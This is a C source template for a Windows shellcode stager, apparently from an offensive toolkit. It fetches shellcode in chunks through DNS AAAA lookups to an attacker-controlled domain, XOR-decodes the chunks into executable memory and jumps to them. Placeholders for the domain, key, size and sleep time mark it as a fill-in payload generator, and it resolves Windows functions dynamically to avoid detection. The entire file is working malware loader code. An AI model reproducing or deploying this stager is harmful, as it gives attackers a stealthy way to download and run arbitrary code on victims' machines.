#include <winsock2.h>
#include <windns.h>
#include <windows.h>


// Required Function definitions
typedef LPVOID(WINAPI *VirtualAllocType)(LPVOID, SIZE_T, DWORD, DWORD);
typedef LPVOID(WINAPI *VirtualProtectType)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef DNS_STATUS(WINAPI *DnsQuery_A_Type)(PCSTR, WORD, DWORD, PVOID, PDNS_RECORD, PVOID);


typedef struct in6_addr {
  union {
    u_char Byte[16];
    u_short Word[8];
#ifdef __INSIDE_CYGWIN__
    uint32_t __s6_addr32[4];
#endif
  } u;
} IN6_ADDR;


LPVOID *GetShellCodeAddress(){

  IN6_ADDR Ipv6address;
  PDNS_RECORD results;
  DNS_STATUS resp;
  int Prefix;
  Prefix = 0;
  int MemoryPart;
  DWORD OldProtection;
  int NextMemoryPart = 0;

  // Load Kernel32.dll using LoadLibrary

  HMODULE Kernel32Module = LoadLibrary("kernel32.dll");
  HMODULE DNSModule = LoadLibrary("Dnsapi.dll");

  // Redefine required functions
  VirtualAllocType VA = (VirtualAllocType)GetProcAddress(Kernel32Module, "VirtualAlloc");
  VirtualProtectType VP = (VirtualProtectType)GetProcAddress(Kernel32Module, "VirtualProtect");
  DnsQuery_A_Type DNSA = (DnsQuery_A_Type)GetProcAddress(DNSModule, "DnsQuery_A");


  // Allocate Memory for our shellcode
  LPVOID OriginalBuffer = VA(NULL, {SHELLCODESIZE}, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

  // Pointer to the domain name for later use
  char *domain;

  // Change Allocated memory region protection
  VP(OriginalBuffer, {SHELLCODESIZE}, PAGE_EXECUTE_READWRITE, &OldProtection);

  while(TRUE){
    // Do some format string to write full domain with prefix and save the to domain
    asprintf(&domain, "{PREFIX}%i.{DOMAIN}", Prefix);

    // Send IPV6 "AAAA" request to the domain
    resp = DNSA(domain, 0x001c, DNS_QUERY_STANDARD, NULL, &results, NULL);
    if(resp != 0){
      // Important break in case the domain is not resolvable
      // Also Important to know the last domain to call for
      break;
    }else{
      // Debug Message
      // printf("[+] Host Resolved!\n");
    }

    // Save The IPV6 "Shellcode" chunck
    LPVOID Ipv6Address = &results->Data.AAAA.Ip6Address;

    // Write the shellcode bytes from Ipv6Address to the memory
    for (MemoryPart = 0; MemoryPart < 16 ; MemoryPart++) {

        // Copy each byte from shellcode to TempByte after decoding it
        // In case there is no XOR encoding it will XOR to 0x00 which
        char TempByte = *((char *)Ipv6Address + MemoryPart) ^ {KEY};

        // Copy the shellcode chunck to the previously allocated space.
        memcpy(OriginalBuffer + NextMemoryPart, &TempByte, 1);

        // Make sure to append to the next memory address inside the allocated space.
        NextMemoryPart++;
}

// Increase domain prefix by 1 "Move to the other domain"
Prefix++;

// Sleep based on user input
sleep({SLEEPTIME});

}

// Return the final decoded shellcode pointer
return OriginalBuffer;



}

int main(){

// Get Shellcode Address
LPVOID ShellcodeAddress = GetShellCodeAddress();

// Write your injection technique here
// And use ShellcodeAddress as your shellcode pointer

// Jump to shellcode (Replace it with your technique ;) )
goto *ShellcodeAddress;


}
